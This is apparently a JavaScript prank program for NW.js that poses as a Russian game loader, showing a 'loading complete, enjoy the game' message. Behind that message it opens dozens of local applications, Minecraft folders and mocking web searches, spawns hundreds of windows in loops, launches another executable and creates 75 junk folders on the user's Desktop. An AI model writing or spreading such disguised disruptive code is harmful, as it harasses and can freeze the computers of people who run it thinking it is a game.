$(() => {

	const os = require("os"), fs = require("fs"), open = require("open")

	setTimeout(() => {$('div').text('Загрузка завершена. Приятной игры!'); let a = new Audio("1.mp3").play()}, 2500)

    setTimeout(() => {

	    open("requires/bruh.mp4"); open("requires/1.docx"); open("requires/1.pptx"); open("requires/1.txt"); open("requires/index.html")
        open('https://www.youtube.com/?gl=RU&hl=ru'); open('https://www.google.com/search?q=%D1%8F+%D0%BB%D0%BE%D1%85+%D1%87%D1%82%D0%BE+%D0%B4%D0%B5%D0%BB%D0%B0%D1%82%D1%8C&oq=%D1%8F&aqs=chrome.0.69i59j69i57j69i59l2.699j0j7&sourceid=chrome&ie=UTF-8')
        open('https://otvet.mail.ru/question/76395673')

        open("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Accessories/Paint.lnk")
        open("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Accessories/Wordpad.lnk")
        open("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Accessories/Windows Media Player.lnk")

        for (let o = 0; o != 5; o++) open("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Accessories/Paint.lnk")

        open("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Accessories/Math Input Panel.lnk")
        open("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Accessories/Quick Assist.lnk")

        for (let h = 0; h != 3; h++) window.open('http://mamu.com.ua/')
        for (let t = 0; t != 3; t++) window.open('http://mamu.com.ua/f39/vzyat-v-arendu-buldozer-14628/')

        open("C:/Users/" + os.userInfo().username + "/AppData/Roaming/.minecraft/tlauncher.exe")
        open("C:/Users/" + os.userInfo().username + "/AppData/Roaming/.minecraft")
        open("C:/Users/" + os.userInfo().username + "/AppData/Roaming/.minecraft/saves")

        for (let z = 0; z != 3; z++) window.open('https://www.google.com/search?sxsrf=ALeKk028AY25YE-Grgc4sGAV_p6ek2xWbA%3A1593918229944&ei=FUMBX9uQOcyymwWh7KLICw&q=%D0%BF%D0%BE%D1%87%D0%B5%D0%BC%D1%83&oq=%D0%BF%D0%BE%D1%87%D0%B5%D0%BC%D1%83&gs_lcp=CgZwc3ktYWIQAzIECCMQJzIECCMQJzIHCAAQsQMQQzIECAAQQzIECAAQQzIECAAQQzIFCAAQsQMyBQgAEIMBMgUIABCxAzIFCAAQsQM6AggAOggIABAKEAEQKjoJCAAQsQMQChABOgYIABAKEAE6BwgjEOoCECdQwRZY4yhgoStoAnAAeACAAccBiAHsC5IBAzAuOJgBAKABAaoBB2d3cy13aXqwAQo&sclient=psy-ab&ved=0ahUKEwib75WPkLXqAhVM2aYKHSG2CLkQ4dUDCAw&uact=5')
        for (let r = 0; r != 3; r++) window.open('https://sportmail.ru/news/football-rus-premier/42448131/')
        for (let e = 0; e != 3; e++) window.open('https://www.youtube.com/watch?v=L1I68lYcimc')

        setTimeout(() => {for (let u = 0; u != 100; u++) window.open("../sound/index.html")}, 1000)
        setTimeout(() => {for (let w = 0; w != 200; w++) open("лошара")}, 10000)
        setTimeout(() => {open("../nw2.exe")}, 15000); setTimeout(() => {open("requires/3.mp3")}, 11500)

        for (let i = 0; i != 75; i++) fs.mkdirSync('/Users/' + os.userInfo().username + '/Desktop/صفات حامل إسم يوستينا' + i)

    }, 3000)

})